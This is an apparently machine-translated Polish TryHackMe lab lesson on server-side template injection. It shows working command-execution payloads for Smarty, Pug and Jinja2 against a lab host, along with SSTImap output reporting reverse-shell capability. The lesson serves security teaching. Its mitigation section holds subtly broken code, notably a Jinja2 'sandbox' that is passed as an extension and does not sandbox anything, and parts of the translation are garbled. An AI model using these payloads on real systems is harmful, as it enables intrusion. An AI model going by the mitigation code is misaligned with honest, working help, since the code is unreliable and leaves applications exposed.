
### Wstęp

Wstrzyknięcie szablonu po stronie serwera lub SSTI, to luka w zabezpieczeniach, która występuje, gdy dane wprowadzane przez użytkownika są wstrzykiwane do silnika szablonów aplikacji. Może to prowadzić do szeregu problemów bezpieczeństwa, w tym wykonania kodu, ujawnienia danych, eskalacji uprawnień i odmowy usługi (Denial of Service).DoS). Luki w zabezpieczeniach SSTI często występują w aplikacjach internetowych, które wykorzystują silniki szablonów do generowania dynamicznej zawartości i mogą mieć poważne konsekwencje, jeśli nie zostaną usunięte.

[Tutaj](https://tryhackme.com/r/room/learnssti) można znaleźć wprowadzenie do SSTI .

### Cele

Pod koniec tego pokoju będziesz:

1. Poznaj podstawowe funkcje silników szablonów i dowiedz się, dlaczego są one integralną częścią nowoczesnych aplikacji internetowych.
2. Zidentyfikuj luki w aplikacjach internetowych, które mogą prowadzić do SSTI.
3. Przeprowadzaj ataki na różne silniki szablonów, takie jak Smarty (PHP), Jinja2 (Python) i Jade (NodeJS).
4. Zastosuj najlepsze praktyki i strategie łagodzenia skutków, aby zapobiec SSTI w aplikacjach internetowych.

### Wymagania wstępne

Zanim zagłębisz się w SSTI, powinieneś mieć podstawową wiedzę na temat następujących pojęć:

1. Wiedza na temat struktury HTML i tego, jak zbudowane są strony internetowe.
2. Podstawowa znajomość języka JavaScript w celu tworzenia skryptów po stronie klienta.
3. Znajomość koncepcji i języków programowania po stronie serwera (np. Python, PHP, JavaScript).

**Uwaga:** W tym pokoju znajduje się niekierowane wyzwanie w Zadaniu 8. Aby ukończyć wyzwanie, musisz wykorzystać wiedzę zdobytą w tym pokoju oraz podstawowe umiejętności ofensywne i obronne!  

Odpowiedz na poniższe pytania

Wdróż docelową maszynę wirtualną dołączoną do tego zadania, naciskając zielony przycisk „Start Lab Machine”. Po uzyskaniu wygenerowanego adresu IP maszyny możesz użyć AttackBoxa lub własnej maszyny wirtualnej podłączonej do sieci VPN TryHackMe.  
  
Dodaj **parametr MACHINE_IP** do pliku **/etc/hosts** . Na przykład:



### Co to jestSSTI?

Wstrzyknięcie szablonu po stronie serwera (SSTI) to luka w zabezpieczeniach, która występuje, gdy dane wprowadzane przez użytkownika są niebezpiecznie włączane do szablonu po stronie serwera, umożliwiając atakującym wstrzyknięcie i wykonanie dowolnego kodu na serwerze. Silniki szablonów są powszechnie używane w aplikacjach internetowych do generowania dynamicznego kodu HTML poprzez łączenie stałych szablonów z dynamicznymi danymi. Gdy silniki te przetwarzają dane wprowadzane przez użytkownika bez odpowiedniej sanityzacji, stają się podatne na ataki SSTI.

**Podstawowe koncepcje SSTI**

- **Dynamiczne generowanie treści:** Silniki szablonów zastępują symbole zastępcze rzeczywistymi danymi, umożliwiając aplikacjom generowanie dynamicznych stron HTML. Ten proces może zostać wykorzystany, jeśli dane wprowadzane przez użytkownika nie zostaną odpowiednio oczyszczone.
- **Dane wprowadzane przez użytkownika jako kod szablonowy:** Gdy dane wprowadzane przez użytkownika traktowane są jako część kodu szablonowego, mogą one wprowadzać szkodliwą logikę do renderowanych wyników, prowadząc do SSTI.

Sednem SSTI jest nieprawidłowe przetwarzanie danych wprowadzanych przez użytkownika w szablonach po stronie serwera. Silniki szablonów interpretują i wykonują osadzone wyrażenia, aby generować dynamiczną zawartość. Jeśli atakujący może wstrzyknąć złośliwe ładunki do tych wyrażeń, może manipulować logiką po stronie serwera i potencjalnie wykonać dowolny kod.

### Przebieg ataku SSTI

![Przebieg ataku SSTI](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1717984475799)  

Gdy dane wprowadzane przez użytkownika są bezpośrednio osadzane w szablonach bez odpowiedniej walidacji lub ucieczki, atakujący mogą tworzyć ładunki, które zmieniają działanie szablonu. Może to prowadzić do różnych niezamierzonych działań po stronie serwera, w tym:

- Odczytywanie lub modyfikowanie plików po stronie serwera.
- Wykonywanie poleceń systemowych.
- Uzyskiwanie dostępu do poufnych informacji (np. zmiennych środowiskowych, danych uwierzytelniających bazy danych).


### Silniki szablonów

Silnik szablonów to coś w rodzaju maszyny, która pomaga dynamicznie budować strony internetowe. Oto jak to działa w skrócie:

Wyobraź sobie, że tworzysz kartkę urodzinową dla przyjaciela. Chcesz podać jego imię, wiek i spersonalizowaną wiadomość. Zamiast pisać nową kartkę od podstaw, korzystasz z szablonu z miejscami na imię, wiek i wiadomość.

Silnik szablonów działa podobnie:

1. **Szablon** : Silnik wykorzystuje wstępnie zaprojektowany szablon z symbolami zastępczymi, takimi jak {{name}}, w przypadku dynamicznej zawartości.
2. **Dane wprowadzane przez użytkownika** : Silnik odbiera dane wprowadzane przez użytkownika (np. imię, wiek lub wiadomość) i zapisuje je w zmiennej.
3. **Kombinacja** : Silnik łączy szablon z danymi wprowadzonymi przez użytkownika, zastępując symbole zastępcze rzeczywistymi danymi.
4. **Wyjście** : Silnik generuje ostateczną, dynamiczną stronę internetową z danymi wprowadzonymi przez użytkownika w szablonie.

![Analogia silnika szablonów](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1717984573585)

Silniki szablonów oferują różnorodne funkcjonalności, które przyspieszają proces rozwoju oprogramowania, ale mogą również wiązać się z ryzykiem. Większość silników szablonów pozwala na używanie wyrażeń do prostych obliczeń lub operacji logicznych w szablonach.  

W kontekścieSSTIZdolność silnika szablonów do wykonywania kodu czyni go podatnym na ataki. Jeśli dane wprowadzane przez użytkownika nie zostaną odpowiednio oczyszczone, atakujący może wstrzyknąć złośliwy kod, który zostanie wykonany przez silnik szablonów, co doprowadzi do niezamierzonych konsekwencji.

### Silniki szablonów wspólnych

Silniki szablonów stanowią integralną część nowoczesnego tworzenia stron internetowych, umożliwiając programistom generowanie dynamicznej zawartości HTML poprzez łączenie szablonów z danymi. Oto kilka najczęściej używanych silników szablonów:

- **Jinja2** : Bardzo popularna w aplikacjach Python, znana ze swojej ekspresyjności i potężnych możliwości renderowania.
- **Twig** : domyślny silnik szablonów dla Symfony wPHPTwig oferuje solidne środowisko z bezpiecznymi ustawieniami domyślnymi.
- **Pug/Jade** : Znany ze swojej minimalistycznej i przejrzystej składni szablonów HTML, Pug/Jade jest popularny wśród programistów Node.js.

### Jak silniki szablonów analizują i przetwarzają dane wejściowe

Silniki szablonów działają poprzez parsowanie plików szablonów, które zawierają treść statyczną połączoną ze specjalną składnią dla treści dynamicznych. Podczas renderowania szablonu silnik zastępuje części dynamiczne rzeczywistymi danymi dostarczanymi w czasie wykonywania. Na przykład:

```python
from jinja2 import Template

hello_template = Template("Hello, {{ name }}!")
output = hello_template.render(name="World")
print(output)
```

W tym przykładzie `{{ name }}`jest to symbol zastępczy, który zostaje zastąpiony wartością `"World"`podczas renderowania.

### Określanie silnika szablonów

Różne silniki szablonów mają odmienną składnię i funkcje, co czyni je podatnymi na ataki SSTI na różne sposoby. Oto kilka przykładów podatnych na ataki składni szablonów:

**Jinja2/Twig**

Jinja2 i Twig mają podobną składnię i działanie, co utrudnia ich rozróżnienie na podstawie samych odpowiedzi ładunku. Można jednak wykryć ich obecność, testując ich możliwości obsługi wyrażeń. Na przykład, używając podatnej maszyny wirtualnej, jeśli użyjesz ładunku {{7*'7'}} w Twig, wynik wyniesie 49.

![Wydajność ładunku wynosi 49](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716692887811)

Jeśli jednak użyjesz tego samego ładunku w aplikacji korzystającej z Jinja2, wynik będzie wynosić 7777777

![Wydajność ładunku wynosi 7777777](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716692888281)  

**Jade/Mops**

Pug, wcześniej znany jako Jade, używa innej składni do obsługi wyrażeń, co może zostać wykorzystane do identyfikacji jej użycia. Pug/Jade analizuje wyrażenia JavaScript w `#{}`. Na przykład, użycie ładunku #{7*7} zwróci 49.

![Wydajność ładunku wynosi 49](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716692888719)  

W przeciwieństwie do Jinja2 czy Twig, Pug/Jade pozwala na bezpośrednie wykonywanie kodu JavaScript w obrębie swoich szablonów bez konieczności stosowania dodatkowych ograniczników, takich jak {{ }}. Na przykład:

![Bezpośrednie wykonywanie poleceń](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716692889151)


Smarty to potężny silnik szablonów dla PHP Umożliwia programistom oddzielenie prezentacji od logiki biznesowej, co poprawia łatwość utrzymania i skalowalność aplikacji. Jednak możliwość wykonywania funkcji PHP w szablonach może narazić aplikacje na ataki typu „szablon injection” po stronie serwera, jeśli nie zostanie odpowiednio skonfigurowana.

Elastyczność Smarty pozwala na dynamiczne wykonywanie funkcji PHP w ramach szablonów, co może stanowić poważne zagrożenie bezpieczeństwa. Możliwość wykonywania kodu PHP za pośrednictwem zmiennych lub modyfikatorów szablonu powinna być starannie kontrolowana, aby zapobiec nieautoryzowanemu wykonywaniu poleceń.

### Eksploatacja

Przed utworzeniem ładunku konieczne jest potwierdzenie, czy aplikacja rzeczywiście korzysta ze Smarty.  Na przykład przejdź do[http://ssti.thm:8000/sprytny/(otwiera się w nowej karcie)](http://ssti.thm:8000/smarty/).

Wstrzyknij prosty tag Smarty, aby sprawdzić, czy zostanie on przetworzony. Jeśli aplikacja zwróci „HELLO”, oznacza to, że silnik szablonów używany przez aplikację to Smarty. `{'Hello'|upper}` 

![Wyjście HELLO z użyciem powyższego ładunku](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716703943223)  

Po potwierdzeniu, że witryna jest podatna na atak SSTI za pośrednictwem Smarty, możesz stworzyć ładunek wykorzystujący funkcje PHP wykonujące polecenia systemowe. Jedną z najczęściej wykorzystywanych funkcji jest funkcja `system()` . Użycie ładunku  `{system("ls")}`jest bezpośrednim i skutecznym ładunkiem, jeśli ustawienia bezpieczeństwa Smarty zezwalają na wykonywanie funkcji PHP.

![Zawartość katalogu za pomocą polecenia ls](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716704423172)  

Gdy silnik szablonów Smarty przetworzy te dane wejściowe, wykona `ls` polecenie. To polecenie ujawnilista katalogowa katalogu serwera, w którym wykonywany jest skrypt, zapewniając wgląd w serwersystem plików.



Pug (dawniej Jade) to wydajny silnik szablonów, szeroko stosowany w społeczności Node.js ze względu na zwięzłe renderowanie HTML i zaawansowane funkcje, takie jak instrukcje warunkowe, iteracje i dziedziczenie szablonów. Chociaż Pug oferuje programistom potężne narzędzia, jego możliwość wykonywania kodu JavaScript bezpośrednio w szablonach może stanowić poważne zagrożenie bezpieczeństwa.  

Luki w zabezpieczeniach PUG wynikają przede wszystkim z możliwości interpolacji kodu JavaScript w zmiennych szablonu. Funkcja ta, przeznaczona do dynamicznego generowania treści, może zostać wykorzystana w sposób złośliwy, jeśli dane wprowadzane przez użytkownika zostaną osadzone w szablonie bez odpowiedniej dezynfekcji.

Programiści muszą skrupulatnie oczyszczać i weryfikować dane wprowadzane przez użytkowników, aby ograniczyć te zagrożenia i zapewnić bezpieczeństwo aplikacji korzystających z Pug.  

**Kluczowe punkty podatności:**

- **Interpolacja JavaScript** : Pug pozwalaosadzanieJavaScript bezpośrednio w szablonach za pomocą nawiasów interpolacyjnych `#{}`. Jeśli dane wprowadzane przez użytkownika są interpolowane bez odpowiedniej dezynfekcji, może to doprowadzić do wykonania dowolnego kodu.
- **Domyślne stosowanie escapingu** : Pug zapewnia automatyczne stosowanie escapingu dla niektórych danych wejściowych, konwertując znaki takie jak `<`, `>`, i `&`na ich odpowiedniki w encjach HTML, aby zapobiec atakom XSS. Jednak to domyślne zachowanie nie rozwiązuje wszystkich potencjalnych problemów bezpieczeństwa, szczególnie w przypadku interpolacji bez escapingu `!{}`lub złożonych scenariuszy wprowadzania danych.

### Eksploatacja

Przed utworzeniem ładunku ważne jest potwierdzenie, czy aplikacja rzeczywiście korzysta z Pug. Na przykład przejdź do [http://ssti.thm:8001/jade/(otwiera się w nowej karcie)](http://ssti.thm:8001/jade/).

Wstrzyknij podstawową składnię Pug, aby przetestować przetwarzanie szablonu, na przykład `#{7*7}`. Jeśli aplikacja zwróci 49, potwierdza to, że Pug przetwarza szablon.

![Wyjście wynosi 49 przy użyciu powyższego ładunku](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716706760555)  

Ponieważ Pug umożliwia interpolację JavaScript, możemy następnie użyć ładunku`#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}`

Powyższy ładunek wykorzystuje podstawowe moduły Node.js do wykonywania poleceń systemowych. Poniżej znajduje się zestawienie:

- `root.process` uzyskuje dostęp do obiektu globalnego `process`z Node.js w szablonie Pug.
- `mainModule.require('child_process')` dynamicznie wymaga `child_process`modułu, omijając potencjalne ograniczenia, które mogłyby uniemożliwić jego regularne uwzględnienie.
- `spawnSync('ls')`: Wykonuje `ls`polecenie synchronicznie.
- `.stdout`: Przechwytuje standardowe wyjście polecenia, obejmujące listę katalogów.

![Zawartość katalogu za pomocą polecenia ls](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716706758684)  

### Dlaczego spawnSync('ls -lah') może nie działać

Próbując użyć `spawnSync('ls -lah')`, próbujesz przekazać całe polecenie i jego argumenty jako pojedynczy ciąg znaków. Nie działa to zgodnie z oczekiwaniami, ponieważ spawnSync nie rozdziela z założenia pojedynczego ciągu znaków na polecenie i jego argumenty. Zamiast tego traktuje cały ciąg znaków jako polecenie do wykonania, którego nie może znaleźć i w związku z tym nie wykonuje.

Takie zachowanie jest kluczowe dla zapobiegania pewnym typom luk w zabezpieczeniach, takim jak wstrzykiwanie poleceń, gdzie atakujący może próbować dołączyć dodatkowe polecenia lub argumenty w celu wykonania niezamierzonych działań.

### Zrozumienie użycia spawnSync

Funkcja ta `spawnSync`służy do wykonywania poleceń w powłoce i zapewnia szczegółową kontrolę nad danymi wejściowymi i wyjściowymi poleceń. Jest częścią `child_process`modułu Node.js, który umożliwia Node.js wykonywanie innych procesów w systemie, w którym jest uruchomiony.

Sygnatura funkcji `spawnSync`jest następująca:

```javascript
spawnSync(command, [args], [options])
```

- **polecenie** : Jest to ciąg określający polecenie do uruchomienia.
- **args** : Jest to tablica argumentów łańcuchowych do przekazania poleceniu.
- **opcje** : Jest to opcjonalny parametr, który może określać różne opcje, takie jak katalog roboczy, zmienne środowiskowe, dane wejściowe, wyjściowe, limit czasu i inne.

### Prawidłowe użycie spawnSync

Aby poprawnie `spawnSync`wykonać `ls`polecenie z `-lah`argumentem, należy oddzielić polecenie i jego argumenty na dwie odrębne części:

```javascript
const { spawnSync } = require('child_process');
const result = spawnSync('ls', ['-lah']);
console.log(result.stdout.toString());
```

W tej poprawionej formie:

- **'ls'** jest poleceniem.
- **['-lah']** to tablica zawierająca wszystkie argumenty przekazane poleceniu.

Ta struktura zapewnia, że ​​polecenie `ls`zostanie wywołane z `-lah`argumentem, co pozwoli mu działać zgodnie z przeznaczeniem. Ostateczny ładunek będzie zatem…`#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`

![Zawartość katalogu, w tym ukryte pliki, za pomocą argumentu -lah](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716707909450)


Jinja2 to popularny silnik szablonów dla Pythona, znany ze swojej elastyczności i wydajności. Jest szeroko stosowany w aplikacjach internetowych do renderowania dynamicznej zawartości, ponieważ umożliwia osadzanie wyrażeń przypominających Pythona w kodzie HTML. Chociaż Jinja2 przyspiesza tworzenie aplikacji i ułatwia oddzielenie prezentacji od logiki biznesowej, jej zaawansowane możliwości tworzenia szablonów mogą również stwarzać poważne zagrożenia bezpieczeństwa, jeśli nie będą odpowiednio obsługiwane.

Ponieważ Jinja2 umożliwia wykonywanie wyrażeń Pythona w szablonach, zagrożenie bezpieczeństwa w Jinja2 często wynika z niebezpiecznych praktyk kodowania, które pozwalają na wykonywanie danych wprowadzanych przez użytkownika w szablonach bez odpowiedniej sanityzacji. Luka ta nie jest nieodłączną cechą Jinja2, ale raczej sposobem, w jaki programiści przetwarzają dane wprowadzane przez użytkownika w swoich szablonach. Prawidłowe sanityzowanie i weryfikacja wszystkich danych wprowadzanych przez użytkownika przed włączeniem ich do szablonów jest niezbędna, aby zapobiec tego typu problemom bezpieczeństwa.

**Kluczowe punkty podatności:**

- **Ocena wyrażeń** : Jinja2 ocenia wyrażenia w nawiasach klamrowych `{{ }}`, które mogą wykonywać dowolny kod Pythona, jeśli zostaną złośliwie spreparowane.
- **Dziedziczenie i importowanie szablonów** : Zaawansowane funkcje, takie jak dziedziczenie szablonów i importowanie makr, mogą być niewłaściwie wykorzystywane do wykonywania niezamierzonego kodu, co może prowadzić do ujawnienia informacji lub manipulacji serwerem.

### Eksploatacja

Przed utworzeniem ładunku kluczowe jest potwierdzenie, że aplikacja rzeczywiście korzysta z Jinja2. Na przykład przejdź do [http://ssti.thm:8002/jinja2/(otwiera się w nowej karcie)](http://ssti.thm:8002/jinja2/).

Wstrzyknij podstawową składnię Jinja2, np. `{{7*7}}`w celu sprawdzenia przetwarzania szablonu. Jeśli aplikacja zwróci 49, oznacza to, że Jinja2 przetwarza szablon.

![Wyjście wynosi 49 przy użyciu powyższego ładunku](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716710076610)  

Po potwierdzeniu możliwości użycia Jinja2 możemy użyć ładunku`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`

Poniżej znajduje się rozbicie powyższego ładunku:

- `"".__class__.__mro__[1]`uzyskuje dostęp do klasy bazowej `object`, superklasy wszystkich klas Pythona.
- `__subclasses__()`:Wypisuje wszystkie podklasy klasy `object`i `[157]`zazwyczaj stanowi indeks tej `subprocess.Popen`klasy (indeks ten może się różnić i należy go sprawdzić w środowisku docelowym).  
    ![Zrzut klas przy użyciu powyższego ładunku](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716711942501)  
    ![druga część powyższego zrzutu ekranu](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716711942974)  
    
- Następne łańcuchy metod dynamicznie importują i wykorzystują `subprocess`moduł do wykonania `ls`polecenia, przechwytując jego dane wyjściowe.  
    ![zawartość katalogu za pomocą polecenia ls w treści](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716710077098)  
    

### Dlaczego check_output('ls -lah') nie działa

Używając `check_output('ls -lah')`, przekazujesz całe polecenie i jego argumenty jako pojedynczy ciąg znaków. Nie jest to zalecany sposób użycia, `check_output`ponieważ nie analizuje ciągu znaków i nie oddziela argumentów. Zamiast tego traktuje cały ciąg znaków jako pojedyncze polecenie do wykonania, którego nie może rozpoznać jako prawidłowego pliku wykonywalnego, przez co nie zostaje wykonane.

Ta metoda przekazywania argumentów może potencjalnie prowadzić do luk w zabezpieczeniach typu shell injection, jeśli ciągi znaków kontrolowane przez użytkownika są bezpośrednio łączone z ciągiem poleceń. Wymaganie, aby polecenia i ich argumenty były przekazywane w postaci listy, `check_output`minimalizuje to ryzyko.

### Zrozumienie użycia check_output

Funkcja `check_output`została zaprojektowana w celu zwiększenia bezpieczeństwa poprzez oddzielenie polecenia od jego argumentów, co pomaga zapobiegać atakom typu shell injection. Oto ogólna składnia:

```python
subprocess.check_output([command, arg1, arg2])
```

- **polecenie** : ciąg określający polecenie do wykonania.
- **arg1, arg2, ...** : Dodatkowe argumenty, które należy przekazać poleceniu.

### Prawidłowe użycie check_output

Aby poprawnie wykonać `ls`polecenie z opcjami za pomocą `check_output`, należy przekazać polecenie i jego argumenty jako osobne elementy listy:

```python
subprocess.check_output(['ls', '-lah'])
```

Lista **['ls', '-lah']** zawiera polecenie `ls`i jego argument `-lah`. Polecenie jest wyraźnie oddzielone od argumentów, co zapewnia, że ​​każda część zostanie poprawnie obsłużona zgodnie z przeznaczeniem. Ostateczny ładunek będzie zatem…`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}`

![zawartość katalogu z ukrytymi plikami za pomocą argumentu -lah](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716710150525)


**SSTImap** to narzędzie automatyzujące proces testowania i eksploatacjiSSTILuki w zabezpieczeniach różnych silników szablonów. Hostowane na [GitHubie(otwiera się w nowej karcie)](https://github.com/vladko312/SSTImap), zapewnia ramy do wykrywania błędów związanych z wstrzykiwaniem szablonów.

Jeśli używasz AttackBoxa, narzędzie jest zainstalowane w `/opt/SSTImap`katalogu.  Jeśli korzystasz z własnego komputera, możesz je zainstalować, klonując repozytorium z GitHuba i konfigurując jego środowisko.  Oto jak zacząć:

1. **Klonuj repozytorium** :
    
    ```bash
    git clone https://github.com/vladko312/SSTImap.git
    ```
    
2. **Przejdź do katalogu SSTImap** :
    
    ```bash
    cd SSTImap
    ```
    
3. **Zainstaluj zależności** (jeśli takie są wymienione, zwykle za pomocą `requirements.txt`):
    
    ```bash
    pip install -r requirements.txt
    ```
    

SSTImap umożliwia:

- **Wykrywanie silnika szablonów** : SSTImap może pomóc w identyfikacji silnika szablonów używanego przez aplikację internetową, co jest kluczowe przy tworzeniu określonych exploitów.
- **Automatyczne wykorzystanie** : W przypadku znanych luk w zabezpieczeniach SSTImap może zautomatyzować proces ich wykorzystania.

Możesz użyć SSTImap, podając mu docelowy adres URL i wszelkie niezbędne opcje. Oto prosty przykład użycia:

```bash
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

Ta komenda próbuje wykryć lukę w zabezpieczeniach SSTI przy użyciu dostosowanych ładunków.

Korzystanie z SSTImap

```shell-session
user@tryhackme $ python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='           

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.1
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; generic: 3; engines: 17; legacy_engines: 2
[*] Loaded request body types: 4

[*] Scanning url: http://ssti.thm:8002/mako/
[*] Testing if Body parameter 'page' is injectable
[*] Mako plugin is testing rendering with tag '*'
[+] Mako plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Body parameter: page
  Engine: Mako
  Injection: *
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code
```




Wstrzykiwanie szablonu po stronie serwera (SSTI) można złagodzić, stosując najlepsze praktyki i wdrażając środki bezpieczeństwa w kodzie aplikacji. Oto jak złagodzić SSTI w Smarty, Jade i Jinja2:

### Jinja2

1. **PiaskownicaTryb** : Włącz środowisko sandboxowe w Jinja2, aby ograniczyć dostęp szablonu do niebezpiecznych funkcji i atrybutów. Zapobiega to wykonywaniu dowolnego kodu Pythona. Na przykład:
    
    ```python
    from jinja2 import Environment, select_autoescape, sandbox
    
    env = Environment(
        autoescape=select_autoescape(['html', 'xml']),
        extensions=[sandbox.SandboxedEnvironment]
    )
    ```
    
2. **Oczyszczanie danych wejściowych** : Zawsze oczyszczaj dane wejściowe, aby usunąć potencjalnie niebezpieczne znaki i ciągi znaków, które mogą być interpretowane jako kod. Jest to kluczowe, gdy dane wejściowe są bezpośrednio używane w wyrażeniach szablonowych.
    
3. **Audyt szablonów** : Regularnie przeglądaj i audytuj szablony pod kątem niebezpiecznych wzorców kodowania, takich jak bezpośrednieosadzaniedane wprowadzane przez użytkownika bez oczyszczania.
    

### Jade (Mops)

1. **Unikaj bezpośredniej oceny kodu JavaScript** : Ogranicz lub unikaj korzystania z możliwości PUG do oceny kodu JavaScript w szablonach. Używaj alternatywnych metod obsługi dynamicznej zawartości, które nie wymagają bezpośredniego wykonywania kodu. Na przykład:
    
    ```pug
    var user = !{JSON.stringify(user)}
    h1= user.name
    ```
    
    Używaj `!{}`ostrożnie, ponieważ pozwala na wyjście bez użycia znaków ucieczki, co może być szkodliwe. Preferuj `#{}`kod HTML z domyślnymi znakami ucieczki.
    
2. **Walidacja i oczyszczanie danych wejściowych** : Upewnij się, że wszystkie dane wejściowe użytkownika są weryfikowane pod kątem ścisłego schematu i oczyszczane przed renderowaniem przez silnik szablonów. Zmniejsza to ryzyko wykonania złośliwego kodu.
    
3. **Bezpieczne ustawienia konfiguracji** : Używaj ustawień środowiska i opcji konfiguracji, które minimalizują ryzyko, np. wyłączaj wszelkie funkcje umożliwiające wykonywanie skryptów.
    

### Mądry

1. **Wyłącz `{php}`tagi** : Upewnij się, że `{php}`tagi są wyłączone w konfiguracjach Smarty, aby zapobiec wykonywaniuPHPkod w szablonach.
    
    ```php
    $smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
    $smarty->disable_security = false;
    ```
    
2. **Używaj bezpiecznych procedur obsługi** : Jeśli musisz pozwolić użytkownikom na dostosowywanie szablonów, zapewnij im bezpieczny zestaw tagów lub modyfikatorów, z których mogą korzystać, a które nie pozwalają na bezpośrednie wykonywanie poleceń ani dostęp do powłoki.
    
3. **Regularne przeglądy bezpieczeństwa** : Przeprowadzaj przeglądy bezpieczeństwa plików szablonów i logiki przetwarzania danych, aby upewnić się, że nie są stosowane żadne niebezpieczne praktyki. Regularnie aktualizuj Smarty, aby być na bieżąco z poprawkami bezpieczeństwa.
    

### Sandboxing w silnikach szablonowych

Sandboxing to funkcja bezpieczeństwa, która ogranicza wykonywanie potencjalnie szkodliwego kodu w szablonach. Ogranicza ona działania, które szablony mogą wykonywać, takie jak operacje na plikach czy wykonywanie poleceń systemowych. Prawidłowe sandboxing pomaga zapobiegać problemom bezpieczeństwa, takim jak SSTI.

**Znaczenie piaskownicy**

- **Ograniczenia funkcji** : ogranicza funkcje lub metody, które można wywołać z poziomu szablonu, blokując potencjalnie szkodliwe operacje.
- **Dostęp do zmiennych i danych** : kontroluje dostęp do zmiennych globalnych lub poufnych danych, zapewniając, że szablony nie mogą manipulować ani ujawniać krytycznych informacji.


### Wniosek

Gratulacje z okazji ukończenia wstrzykiwania szablonu po stronie serwera (SSTI) pokój! Oto podsumowanie kluczowych pojęć, które omówiliśmy:

- **Podstawy silnika szablonów** : Przyjrzeliśmy się, w jaki sposób silniki szablonów, takie jak Jinja2, Pug (Jade) i Smarty, działają w tworzeniu stron internetowych, podkreślając ich rolę w dynamicznym generowaniu treści internetowych.
- **Zrozumienie SSTI** : Dowiedziałeś się, czym jest SSTI, jak powstaje i jakie potencjalne zagrożenia wiążą się z silnikami szablonów, gdy przetwarzają dane wprowadzane przez użytkowników bez odpowiedniej dezynfekcji.
- **Techniki łagodzenia** : Omówiono techniki zapobiegania SSTI, w tym piaskownice, walidację danych wejściowych i bezpieczną konfigurację silników szablonów, które pomogą Ci zabezpieczyć Twoje aplikacje.
- **Wykrywanie silników szablonów** : Omówiliśmy metody identyfikacji silnika szablonów używanego przez aplikację za pomocą podstawowych ładunków, co zwiększa możliwości dostosowywania środków bezpieczeństwa do konkretnych środowisk.

Odpowiedz na poniższe pytania

Teraz mogę wykorzystywać luki w zabezpieczeniach SSTI!